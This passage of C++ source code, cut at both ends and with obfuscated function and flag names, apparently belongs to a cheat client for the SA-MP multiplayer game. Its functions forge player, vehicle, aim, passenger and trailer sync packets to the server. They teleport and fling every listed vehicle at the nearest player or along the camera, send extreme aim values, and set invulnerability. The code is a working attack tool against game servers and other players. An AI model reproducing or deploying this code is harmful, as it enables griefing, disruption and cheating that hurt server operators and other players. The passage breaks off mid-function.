			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1] + rand()%140;
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2] + rand()%140;
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
  return;
}



void cheat_handle_pickmaasssssswqzzq141aa111211xx()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas131 == 1 )  
  { 
	  stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0] + rand()%140;
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1] + rand()%140;
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2] + rand()%140;
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));
		
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
  }
  return;
}



void cheat_handle_pickmaasssssswqzzq141aa111211vvc()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas20 == 1 )  
  { 
	  
			stInCarData onSync;
			ZeroMemory(&onSync, sizeof(stInCarData)); 
			
			onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
			onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;  
			onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];
		
			
			onSync.fQuaternion[0] = 0;
				onSync.fQuaternion[1] = 1;
				onSync.fQuaternion[2] = 0;
				onSync.fQuaternion[3] = 0;
			
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_VEHICLE_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stInCarData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);


  }
  return;
}








void cheat_handle_pickmaasssssswqzzq141aa111211x()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas19 == 1 )  
  { 
	  if(KEY_PRESSED(VK_LBUTTON))
	  {
	  actor_info * actor = actor_info_get(ACTOR_SELF, NULL);
	  vehicle_info * vehicle = vehicle_info_get(VEHICLE_SELF,NULL);
	if (!actor)
		return;

	if (!vehicle)
		return;

	float fPos[3];
	vect3_copy(&actor->base.matrix[4 * 3], fPos);


	fPos[0] += sinf(-actor->fCurrentRotation) * 15.0f;
	fPos[1] += cosf(-actor->fCurrentRotation) * 15.0f;

	float fGroundZHeight = pGame->GetWorld()->FindGroundZForPosition(fPos[0], fPos[1]);

	fPos[2] = fGroundZHeight;

	stUnoccupiedData unSync;
	 BitStream bsUnoccupiedSync;
	ZeroMemory(&unSync,sizeof(stUnoccupiedData));

	unSync.sVehicleID = getSAMPVehicleIDFromGTAVehicle(vehicle);

	vect3_copy(fPos, unSync.fPosition);

	unSync.fRoll[0] = 100; // size x   100
	unSync.fRoll[1] = 100; // size y	100
	unSync.fRoll[2] = 100; // size z	100

	vect3_zero(unSync.fMoveSpeed);
	vect3_zero(unSync.fTurnSpeed);

	vect3_copy(unSync.fRoll, &vehicle->base.matrixStruct->right.X);
	unSync.fDirection[0] = 100; // 100
	unSync.fDirection[1] = 100; // 100b2
	unSync.fDirection[2] = -2; //-2.0f

	vect3_copy(unSync.fDirection, &vehicle->base.matrixStruct->up.X);
	unSync.fHealth = 1000.0f;

	bsUnoccupiedSync.Write((BYTE)ID_UNOCCUPIED_SYNC);
	bsUnoccupiedSync.Write((PCHAR)&unSync, sizeof(stUnoccupiedData));
	g_DrifeitClient->Send(&bsUnoccupiedSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
	

	cheat_vehicle_teleport(vehicle, fPos, gta_interior_id_get());

	vehicle->hitpoints = 1000.0f;

  }
  }
}


void cheat_handle_pickmaasssssswqzzq141aa111211x1()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas18 == 1 )  
  { 
	 stOnFootData onSync;
			ZeroMemory(&onSync, sizeof(stOnFootData)); 
			
			onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth; 
			onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
			
			onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
			onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
			onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
			
			onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
			onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
			onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];
		
			onSync.fQuaternion[0] = 0;
				onSync.fQuaternion[1] = 1;
				onSync.fQuaternion[2] = 0;
				onSync.fQuaternion[3] = 0; 
		
			 BitStream bsData;
			bsData.Write((BYTE)ID_PLAYER_SYNC);
			bsData.Write((PCHAR)&onSync,sizeof(stOnFootData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);

  }
  return;
}


void cheat_handle_pickmaasssssswqzzq141aa1112111q()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas17 == 1 )  
  {  
			cheat_state->actor.invulnerable = 1;
			cheat_state->_generic.pic = 1;
			stAimData aimSync;
			ZeroMemory(&aimSync, sizeof(stAimData)); 
			aimSync.fAimZ = g_Players->pLocalPlayer->aimData.fAimZ;
			aimSync.vecAimf1[0] = g_Players->pLocalPlayer->aimData.vecAimf1[0];
			aimSync.vecAimf1[1] = g_Players->pLocalPlayer->aimData.vecAimf1[1];
			aimSync.vecAimf1[2] = g_Players->pLocalPlayer->aimData.vecAimf1[2];
			aimSync.vecAimPos[0] = g_Players->pLocalPlayer->aimData.vecAimPos[0];
			aimSync.vecAimPos[1] = g_Players->pLocalPlayer->aimData.vecAimPos[1];
			aimSync.vecAimPos[2] = g_Players->pLocalPlayer->aimData.vecAimPos[2];
			aimSync.byteCamMode = g_Players->pLocalPlayer->aimData.byteCamMode;
			aimSync.byteCamExtZoom = g_Players->pLocalPlayer->aimData.byteCamExtZoom;
			aimSync.byteWeaponState = g_Players->pLocalPlayer->aimData.byteWeaponState;
			aimSync.bUnk = g_Players->pLocalPlayer->aimData.bUnk;

			aimSync.vecAimPos[2] = pow(300.f + random_float(0, 1), random_float(2, 15))*(int)random(-10, 10) * 3;
			aimSync.byteCamMode = 53;
			aimSync.byteWeaponState = WS_MORE_BULLETS;

			 BitStream bsData;
			bsData.Write((BYTE)ID_AIM_SYNC);
			bsData.Write((PCHAR)&aimSync,sizeof(stAimData));
			
			g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
  }
  return;
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasaswewe4554()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddserer4554 == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE); 
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;



		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
		goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
		v++;
		goto find_another_car;
		}

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);

		float fSpeed[3];
		fSpeed[0] = sinf(fPos[0]) * 5;
		fSpeed[1] = cosf(fPos[1]) * 5;
		fSpeed[2] = cosf(fPos[1]) * 5;

		//float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		INCAR_SYNC_DATA vehSync;
		memset(&vehSync, 0, sizeof(INCAR_SYNC_DATA));

		vehSync.VehicleID = iSAMPVehicleID;
		vehSync.vecPos[0] = fPos[0];
		vehSync.vecPos[1] = fPos[1];
		vehSync.vecPos[2] = fPos[2];
		vehSync.fCarHealth = vinfo->hitpoints;
		vehSync.vecMoveSpeed[0] = fSpeed[0];
		vehSync.vecMoveSpeed[1] = fSpeed[1];
		vehSync.vecMoveSpeed[2] = fSpeed[2];
		vehSync.wKeys = 0;
		vehSync.bytePlayerHealth = nearest->hitpoints;

		SendFakeDriverFullSyncData(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		//vect3_zero(vinfo->speed);
		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];

		v++;

		find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
		if (g_Vehicles->iIsListed[v] == 1)
		break;
		}

		if (v >= SAMP_VEHICLE_MAX)
		v = 0;
	}
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasaswewell()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddllserer == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		stOnFootData onSync;
		ZeroMemory(&onSync, sizeof(stOnFootData));

		onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
		onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;
		
		onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
		onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
		onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];
	
		onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
		onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
		onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);
		
		onSync.fPosition[0] = fPos[0] += -3 + rand() % 3;
		onSync.fPosition[1] = fPos[1] += -3 + rand() % 3;

		onSync.fQuaternion[0] = random_float(-1, 1);
		onSync.fQuaternion[1] = random_float(-1, 1);
		onSync.fQuaternion[2] = random_float(-1, 1);
		onSync.fQuaternion[3] = random_float(-1, 1);
		onSync.iCurrentAnimationID = 0x3C5;
		onSync.fMoveSpeed[0] = sinf(fPos[0]) * 10;
		onSync.fMoveSpeed[1] = cosf(fPos[1]) * 10;
		onSync.iCurrentAnimationID = 0x3C5;

		 BitStream bsData;
		bsData.Write((BYTE)ID_PLAYER_SYNC);
		bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
		//for (int i = 0; i < 2; i++)
		g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
}

uint32_t encode_panels(unsigned char flp, unsigned char frp, unsigned char rlp, unsigned char rrp, unsigned char windshield, unsigned char front_bumper, unsigned char rear_bumper)
{
	return flp | (frp << 4) | (rlp << 8) | (rrp << 12) | (windshield << 16) | (front_bumper << 20) | (rear_bumper << 24);
}

uint32_t encode_doors(unsigned char bonnet, unsigned char boot, unsigned char driver_door, unsigned char passenger_door)
{
	return bonnet | (boot << 8) | (driver_door << 16) | (passenger_door << 24);
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasdsaswewell()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddllseredsr == 1)
	{
		static bool bSendLocal = false;
		if (g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bFiringWeapon)
		{
			//pPedSelf->Respawn(pPedSelf->GetPosition(), false);
			GTAfunc_DisembarkInstantly();
			stOnFootData OnFoot;
			memcpy(&OnFoot, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
			OnFoot.sKeys = 0;
			OnFoot.stSampKeys.keys_aim = 0;
			OnFoot.stSampKeys.keys_primaryFire = 0;
			OnFoot.stSampKeys.keys_secondaryFire__shoot = 0;
			OnFoot.byteSpecialAction = 1;
			 BitStream bsData4OnFoot;
			bsData4OnFoot.Write((BYTE)ID_PLAYER_SYNC);
			bsData4OnFoot.Write((PCHAR)&OnFoot, sizeof(stOnFootData));
			g_DrifeitClient->Send(&bsData4OnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
			bSendLocal = true;
		}
		else
		{
			if (bSendLocal)
			{
				 BitStream bsData4OnFoot;
				bsData4OnFoot.Write((BYTE)ID_PLAYER_SYNC);
				bsData4OnFoot.Write((PCHAR)&g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
				g_DrifeitClient->Send(&bsData4OnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				bSendLocal = false;
			}
		}
	}
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasaswewell1212()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddllsere1212r == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		stInCarData onSync;
		ZeroMemory(&onSync, sizeof(stInCarData));

		onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
		onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth;
		onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
		onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;

		onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
		onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
		onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];

		onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
		onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
		onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);

		onSync.fPosition[0] = fPos[0] += -3 + rand() % 3;
		onSync.fPosition[1] = fPos[1] += -3 + rand() % 3;

		onSync.fQuaternion[0] = random_float(-1, 1);
		onSync.fQuaternion[1] = random_float(-1, 1);
		onSync.fQuaternion[2] = random_float(-1, 1);
		onSync.fQuaternion[3] = random_float(-1, 1);	
		onSync.fMoveSpeed[0] = sinf(fPos[0]) * 10;
		onSync.fMoveSpeed[1] = cosf(fPos[1]) * 10;

		 BitStream bsData;
		bsData.Write((BYTE)ID_VEHICLE_SYNC);
		bsData.Write((PCHAR)&onSync, sizeof(stInCarData));
		//for (int i = 0; i < 2; i++)
		g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
}



void SendFakeUnnocupiedFullSyncData1(stUnoccupiedData *picSync, int iUseCarPos)
{
	if (picSync == NULL)
		return;

	
	 BitStream bsVehicleSync;
	if (iUseCarPos)
	{
		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[picSync->sVehicleID]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

		if (!vinfo)
			return;

		float fPos[3];
		vect3_copy(&vinfo->base.matrix[4 * 3], fPos);
		picSync->fPosition[0] = fPos[0];
		picSync->fPosition[1] = fPos[1];
		picSync->fPosition[2] = fPos[2];
	}

	bsVehicleSync.Write((BYTE)ID_UNOCCUPIED_SYNC);
	bsVehicleSync.Write((PCHAR)picSync, sizeof(stUnoccupiedData));

	g_DrifeitClient->Send(&bsVehicleSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
	
}

void SendFakePassengedFullSyncData1(stPassengerData *picSync, int iUseCarPos)
{
	if (picSync == NULL)
		return;


	 BitStream bsVehicleSync;
	if (iUseCarPos)
	{
		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[picSync->sVehicleID]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

		if (!vinfo)
			return;

		float fPos[3];
		vect3_copy(&vinfo->base.matrix[4 * 3], fPos);
		picSync->fPosition[0] = fPos[0];
		picSync->fPosition[1] = fPos[1];
		picSync->fPosition[2] = fPos[2];
	}

	bsVehicleSync.Write((BYTE)ID_PASSENGER_SYNC);
	bsVehicleSync.Write((PCHAR)picSync, sizeof(stPassengerData));

	g_DrifeitClient->Send(&bsVehicleSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
}

void SendFakeTrailerFullSyncData1(stTrailerData *picSync, int iUseCarPos)
{
	if (picSync == NULL)
		return;


	 BitStream bsVehicleSync;
	if (iUseCarPos)
	{
		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[picSync->sTrailerID]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

		if (!vinfo)
			return;

		float fPos[3];
		vect3_copy(&vinfo->base.matrix[4 * 3], fPos);
		picSync->fPosition[0] = fPos[0];
		picSync->fPosition[1] = fPos[1];
		picSync->fPosition[2] = fPos[2];
	}

	bsVehicleSync.Write((BYTE)ID_TRAILER_SYNC);
	bsVehicleSync.Write((PCHAR)picSync, sizeof(stTrailerData));

	g_DrifeitClient->Send(&bsVehicleSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
}

void SendFakeEctopicFullSyncData1(stInCarData *picSync, int iUseCarPos)
{
	if (picSync == NULL)
		return;


	 BitStream bsVehicleSync;
	if (iUseCarPos)
	{
		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[picSync->sVehicleID]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info *vinfo = vehicle_info_get(car_id, 0);

		if (!vinfo)
			return;

		float fPos[3];
		vect3_copy(&vinfo->base.matrix[4 * 3], fPos);
		picSync->fPosition[0] = fPos[0];
		picSync->fPosition[1] = fPos[1];
		picSync->fPosition[2] = fPos[2];
	}

	bsVehicleSync.Write((BYTE)ID_STATS_UPDATE);
	bsVehicleSync.Write((PCHAR)picSync, sizeof(stInCarData));

	g_DrifeitClient->Send(&bsVehicleSync, SYSTEM_PRIORITY, UNRELIABLE, 0);
}

void cheat_handle_pickmaggfasssssswqzzq141aa1112111qasas()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddsbbbb == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;



		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);


		fPos[0] += -3 + rand() % 6;
		fPos[1] += -3 + rand() % 6;
		//fPos[2] += 20.0f;

		float fSpeed[3];
		fSpeed[0] = sinf(fPos[0]) * 5;
		fSpeed[1] = cosf(fPos[1]) * 5;


		//float fSpeed[3];
		//fSpeed[0] = sinf(fPos[0]) * 5;
		//fSpeed[1] = cosf(fPos[1]) * 5;
		//fSpeed[2] = cosf(fPos[1]) * 5;

		//float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		stPassengerData vehSync;
		memset(&vehSync, 0, sizeof(stPassengerData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		vehSync.byteHealth = nearest->hitpoints;

		SendFakePassengedFullSyncData1(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		//vect3_zero(vinfo->speed);
		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];

		v++;

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;
	}
}

void cheat_handle_grtdfdfdsds()
{
	traceLastFunc("cheat_handle_grt()");
	if (cheat_state->_generic.grtrtrt455dsds4 == 1)
	{
		static int once = 1;
		static int carUsed[SAMP_VEHICLE_MAX];


		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);

		static int v = 0;
		static int x = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		if (KEY_DOWN(VK_LBUTTON))
		{
			float fPos[3];
			vect3_copy(&self->base.matrix[4 * 3], fPos);

			fPos[0] += cam_matrix[4] * (6.0f + x);
			fPos[1] += cam_matrix[5] * (6.0f + x);
			fPos[2] += cam_matrix[6] * (6.0f + x);

			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 7.5f;
			fSpeed[1] = cam_matrix[5] * 7.5f;
			fSpeed[2] = cam_matrix[6] * 7.5f;

			stInCarData vehSync;
			memset(&vehSync, 0, sizeof(stInCarData));
			vehSync.byteCurrentWeapon = 0;
			vehSync.sVehicleID = iSAMPVehicleID;
			vehSync.fPosition[0] = fPos[0];
			vehSync.fPosition[1] = fPos[1];
			vehSync.fPosition[2] = fPos[2];
			vehSync.byteCurrentWeapon = 0;
			//vehSync.byteHealth = self->hitpoints;
			//vehSync.byteArmour = self->armor;

			SendFakeEctopicFullSyncData1(&vehSync, 0);
			cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
			vinfo->speed[0] = fSpeed[0];
			vinfo->speed[1] = fSpeed[1];
			vinfo->speed[2] = fSpeed[2];

			x--;
			if (x < -1) x = 0;

			v++;
		}

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;
	}
	return;
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasEWWEaswewedffdll1212WEWEWE()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddllsdssdeWEWEre121EWWEEW2r == 1)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);
		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}





		float fPos[3];
		vect3_copy(&self->base.matrix[4 * 3], fPos);

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 20.0f);
		fPos[1] += (cosf(-self->fCurrentRotation) * 20.0f);
		fPos[2] += 2.0f;









		stTrailerData vehSync;
		memset(&vehSync, 0, sizeof(stTrailerData));

		vehSync.sTrailerID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];


		SendFakeTrailerFullSyncData1(&vehSync, 0);
		cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
		vect3_zero(vinfo->speed); 

		v++;

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;


	}
}

void cheat_handle_grtdfdf()
{
	traceLastFunc("cheat_handle_grt()");
	if (cheat_state->_generic.grtrtrt4554 == 1)
	{
		static int once = 1;
		static int carUsed[SAMP_VEHICLE_MAX];


		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);

		static int v = 0;
		static int x = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		if (KEY_DOWN(VK_LBUTTON))
		{
			float fPos[3];
			vect3_copy(&self->base.matrix[4 * 3], fPos);

			fPos[0] += cam_matrix[4] * (6.0f + x);
			fPos[1] += cam_matrix[5] * (6.0f + x);
			fPos[2] += cam_matrix[6] * (6.0f + x);

			float fSpeed[3];
			fSpeed[0] = cam_matrix[4] * 7.5f;
			fSpeed[1] = cam_matrix[5] * 7.5f;
			fSpeed[2] = cam_matrix[6] * 7.5f;

			stPassengerData vehSync;
			memset(&vehSync, 0, sizeof(stPassengerData));

			vehSync.sVehicleID = iSAMPVehicleID;
			vehSync.fPosition[0] = fPos[0];
			vehSync.fPosition[1] = fPos[1];
			vehSync.fPosition[2] = fPos[2];
			vehSync.byteHealth = self->hitpoints;
			//vehSync.byteArmour = self->armor;

			SendFakePassengedFullSyncData1(&vehSync, 0);
			cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
			vinfo->speed[0] = fSpeed[0];
			vinfo->speed[1] = fSpeed[1];
			vinfo->speed[2] = fSpeed[2];

			x--;
			if (x < -1) x = 0;

			v++;
		}

	find_another_car:
		for (v; v < SAMP_VEHICLE_MAX; v++)
		{
			if (g_Vehicles->iIsListed[v] == 1)
				break;
		}

		if (v >= SAMP_VEHICLE_MAX)
			v = 0;
	}
	return;
}

void cheat_handle_pickmaasssssswqzzq141aa1112111qasaswewedffdll1212WEWEWE()
{
	traceLastFunc("cheat_handle_pickmaa()");
	if (cheat_state->_generic.asasasas17sdsddllsdssdere121EWWEEW2r == 1)
	{
		struct actor_info	*self = actor_info_get(ACTOR_SELF, 0);
		static int v = 0;

		if (g_Vehicles->iIsListed[v] != 1)
			goto find_another_car;

		int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if (iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}





		float fPos[3];
		vect3_copy(&self->base.matrix[4 * 3], fPos);

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 20.0f);
		fPos[1] += (cosf(-self->fCurrentRotation) * 20.0f);
		fPos[2] += 2.0f;

		







		stPassengerData vehSync;
		memset(&vehSync, 0, sizeof(stPassengerData));

		vehSync.sVehicleID = iSAMPVehicleID;
		vehSync.fPosition[0] = fPos[0];
		vehSync.fPosition[1] = fPos[1];
		vehSync.fPosition[2] = fPos[2];
		

